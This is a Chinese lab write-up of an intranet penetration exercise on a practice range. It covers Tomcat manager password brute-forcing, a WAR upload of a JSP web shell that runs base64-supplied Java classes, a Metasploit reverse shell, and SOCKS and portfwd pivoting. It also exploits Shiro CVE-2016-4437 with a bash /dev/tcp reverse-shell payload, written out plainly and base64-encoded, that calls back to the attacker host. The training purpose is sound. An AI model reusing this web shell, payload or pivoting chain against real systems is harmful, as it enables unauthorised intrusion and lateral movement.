# 漏洞利用

## tomcat-pass-getshell

```python

tomcat-pass-getshell:latest 是一个基于 ​​Apache Tomcat 弱口令漏洞​​ 和 ​​后台 WAR 文件上传漏洞​​ 的靶场环境，主要用于演示攻击者如何通过弱口令登录 Tomcat 管理后台并上传恶意 WAR 包获取服务器权限（即 "getshell"）。

```

### 爆破密码

登录web页面进行抓包，发现base64加密认证字段

![alt text](images/image-56.png)

base64解码确实为输入的`admin:admin`

![alt text](images/image-57.png)

发送数据包到intruder，设置自定义迭代器(custom interator),输入常见用户名，这里为了节省时间，只输入了七条，可以加载密码本进行爆破

![alt text](images/image-58.png)

配置位置2，用户名和密码之间的':'

![alt text](images/image-59.png)

同理设置位置3需要的密码

![alt text](images/image-60.png)

取消默认url编码

![alt text](images/image-61.png)

选择base64编码

![alt text](images/image-62.png)

注意需要点击才不报错

![alt text](images/image-63.png)

爆破成功，发现正是`tomcat:tomcat` base64编码值

![alt text](images/image-64.png)

### 利用漏洞

```info
# 启用数据库 sudo service postgresql start
# 初始化数据库 sudo msfdb init
# 查看状态 db_status
```

![alt text](images/image-6.png)

登录点击`list Application`

![alt text](images/image-65.png)

编写`test.jsp`木马

```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

使用`jar cvf test.war test.jsp`进行打包，将生成的test.war上传到tomcat服务器，会显示`ok`并出现`test`

![alt text](images/image-66.png)

尝试利用，点击`test`，输入`ip a`,`whoami`可以发现利用成功

![alt text](images/image-67.png)

![alt text](images/image-68.png)

获取`flag`

![alt text](images/image-69.png)

### msf获取反弹shell

使用metasploit获取反弹shell，搜索模块tomcat，发现tomcat_mgr_upload和tomcat_mgr_deploy

![alt text](images/image-2.png)

经过测试，使用tomcat_mgr_upload模块能够获取shell，而tomcat_mgr_deploy无法获得，配置参数如下

```sh
    set LHOST 192.168.249.8
    set RHOST 192.168.249.5 
    set RPORT 51445 #随端口变化
    set HttpPassword tomcat
    set HttpUsername tomcat
```

运行即可获得相应的反弹shell

![alt text](images/image-3.png)

## 搜集信息

`CTRL+Z`退出对话，使用`ipconfig`查看网络信息，可以看到该主机ip为192.168.1.3

![alt text](images/image-4.png)

可以使用`(multi/gather/ping_sweep)`模块查看该网段其它主机信息，配置`SESSION`之前获取反弹shell的对话序号，`RHOSTS`为`192.168.1.0/24`

![alt text](images/image.png)

建立路由

```sh
use post/multi/manage/autoroute
set SESSION 1  # 替换为你的会话编号
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run

```

![alt text](images/image-5.png)

扫描端口已知IP的开放端口

```sh
use auxiliary/scanner/portscan/tcp
set PORTS 1-10000
set RHOSTS 192.168.1.1-3
run
```

![alt text](images/image-9.png)

![alt text](images/image-10.png)

### 方法一:socks代理

设置路由

```sh
use multi/manage/autoroute
set session 1
run
```

![alt text](images/image-30.png)

查看是否成功`route print`

![alt text](images/image-34.png)

配置ProxyChains,编辑`/etc/proxychains.conf`，添加以下内容

```sh
socks5 127.0.0.1 1080
```

![alt text](images/image-8.png)

设置`SOCKS`代理访问内网主机,启动`SOCKSs_proxy`代理板块，不用设置什么，直接运行即可

```sh
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1      # 设置监听地址为本地回环地址
set SRVPORT 1080           # 设置监听端口为 1080（或其他未被占用的端口）
set session 1
set VERSION 5            # 设置 SOCKS 版本为 4a（或 5，根据需要选择）
run
```

![alt text](images/image-31.png)

查看服务器是否正常运行

![alt text](images/image-32.png)

![alt text](images/image-33.png)

尝试curl访问内网资源，成功,说明通过代理已经能够访问内网

`proxychains curl 192.168.1.2:8080`

![alt text](images/image-11.png)

火狐浏览器配置socks代理127.0.0.1:1080,burpsuite抓包代理127.0.0.1:8080

![alt text](images/image-35.png)

burpsuite配置socks代理和代理监听，记得点`use SOCKS proxy`,不用设置上游代理

![alt text](images/image-36.png)

![alt text](images/image-37.png)

访问浏览器内网192.168.1.1正常，抓包正常（同样可以在宿主机配置proxy switchy omega设置socks5代理到192.168.249.8:1080）

![alt text](images/image-38.png)

![alt text](images/image-39.png)

![alt text](images/image-40.png)

## 方法二:portfwd端口转发和端口映射

```sh
portfwd 是借用 meterpreter shell 建立的连接进行数据传输，达到端口转发的目的。
```

---

将192.168.1.1-3的8080端口分别转发到攻击者主机，访问web发现均没问题

```sh
 portfwd add -l 8081 -p 8080 -r 192.168.1.1
```

![alt text](images/image-13.png)

![alt text](images/image-15.png)

![alt text](images/image-16.png)

![alt text](images/image-17.png)

配置burpsuite代理127.0.0.1:8080,并开启浏览器代理

![alt text](images/image-19.png)

![alt text](images/image-20.png)

访问web服务进行抓包，这时候burpsuite能够抓取到数据包，但是就会访问不了服务，将端口转发删除后即可重新访问

![alt text](images/image-21.png)

经过各种尝试找到原因为，burpsuite默认http/1 close,使用keep-alive即可

![alt text](images/image-24.png)

在访问服务时抓包不会再次断开，并且能够捕获流量

![alt text](images/image-25.png)

## shiro-cve_2016_4437

```info
CVE-2016-4437 是 ​​Apache Shiro​​ 框架中的一个高危反序列化漏洞（又称 ​​Shiro-550​​），允许攻击者通过默认硬编码的 AES 密钥构造恶意序列化数据，触发远程代码执行（RCE）。
```

端口转发后，发现shiro框架

![alt text](images/image-27.png)

抓包获取信息

![alt text](images/image-28.png)

使用`burpsuite`抓取当前页面数据包，在`cookie`中添加`rememberMe=1`，在响应包中显示两个`Set-Cookie: rememberMe=deleteMe`，说明存在`shiro`框架可能存在漏洞

![alt text](images/image-29.png)

### 漏洞验证和利用

#### 方案一：shiro工具

下载shiro工具，github地址`https://github.com/j1anFen/shiro_attack`

使用`java -jar shiro_attack-2.2.jar`运行

![alt text](images/image-41.png)

运行后会发现超时，原因是没有添加代理运行。
运行`proxychains java -jar shiro_attack-2.2.jar -u http://192.168.1.1:8080`，随便输入指定密钥然后爆破就能获取正确密钥

![alt text](images/image-42.png)

点击`爆破利用链及回显`和`命令执行`

![alt text](images/image-43.png)

可以发现已经获得shell，输入`whoami`查看当前用户

![alt text](images/image-44.png)

查看flag

![alt text](images/image-45.png)

![alt text](images/image48.png)

至此已经拿下192.168.1.0/24网段所有机器,192.168.1.1(tomcat),192.168.1.2(靶场服务),192.168.1.3(shiro)

查看ip，可以发现出现了新网段

![alt text](images/image-46.png)

#### 方案二：构造payload

注意点:
`因为需要安装一些库所以在宿主机攻击，反弹到攻击机`
`攻击需要进行dnslog回显dnslog.cn连接不上可以切换手机热点，并且手机要关闭wifi`

github下载攻击源码

![alt text](images/image-79.png)

添加socks代理(需要确认已经部署好socks代理服务器)

![alt text](images/image-70.png)

```python
import socks
import socket

socks.set_default_proxy(socks.SOCKS5, "192.168.249.8", 1080)
socket.socket = socks.socksocket
JAR_FILE = 'ysoserial.jar'
```

在攻击机里边执行`nc -lvnp 6666`

![alt text](images/image-71.png)

构造攻击负载`bash -i >& /dev/tcp/192.168.249.8/6666 0>&1`(ip为攻击者主机)并进行bash编码

```sh
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0OS44LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
```

![alt text](images/image-72.png)

攻击

![alt text](image-73.png)

成功拿到shell

![alt text](images/image-74.png)

#### 代理内网第二层

同上在本地进行注入payload，使用msf模块`use exploit/multi/handler`进行监听

![alt text](images/image-75.png)

这是普通shell会话，无法使用`autoroute`等板块，升级`sessions -u 2`

![alt text](images/image-76.png)

扫描网段存活ip

建立路由

![alt text](images/image-77.png)

添加代理和之前不能重复

![alt text](images/image-78.png)

同第一层内网使用`scanner/discovery/arp_sweep`扫描IP`auxiliary/scanner/portscan/tcp`扫描端口，获取到主机信息

可以访问内网啦

![alt text](images/image-80.png)

## 问题及解决

__消除burpsuite中抓到包detectportal.firefox.com的数据包.__

![alt text](images/image-22.png)

![alt text](images/image-23.png)

__burpsuite捕获流量会使服务断开，捕获假流量.__

![alt text](images/image-24.png)

![alt text](images/image-26.png)

__配置代理时，没有正确设置路由和浏览器burpsuite没有正确设置代理导致抓不到包是，不需要设置上游代理.__

__按照网上的tomcat_mgr_deploy不行，发现tomcat_mgr_upload可以.__

__构造爆破payload时候需要留两行以上，否则无法发送.__

![alt text](images/image-54.png)

![alt text](images/image-55.png)

[Tomcat弱口令复现及利用(反弹shell)](https://blog.csdn.net/weixin_45695535/article/details/123952845)

[记一次自己搭建内网靶场（非常详细），零基础入门到精通，看这一篇就够了](https://blog.csdn.net/weixin_51725318/article/details/143042111)

[内网安全之：Metasploit 跳板攻击：portfwd 端口转发与端口映射](https://blog.csdn.net/f_carey/article/details/120091375)

[随笔小记—解决火狐浏览器自动向http://detectportal.firefox.com发包的问题](https://blog.csdn.net/kongzhian/article/details/111595144)

[BurpSuite连接浏览器代理无法打开部分网页问题 ](https://www.cnblogs.com/sK07XdAy/p/18168408)

[tomcat弱口令后台getshell漏洞复现](https://www.cnblogs.com/Junglezt/p/18122284)

[shiro反序列化漏洞(CVE-2016-4437)漏洞复现](https://blog.csdn.net/HEAVEN569/article/details/125389987)

[Shiro-CVE-2016-4437 漏洞复现](https://www.freebuf.com/articles/web/372862.html)

[shiro反序列化漏洞复现（CVE-2016-4437 ）](https://blog.csdn.net/wangzhifei1/article/details/135640524)
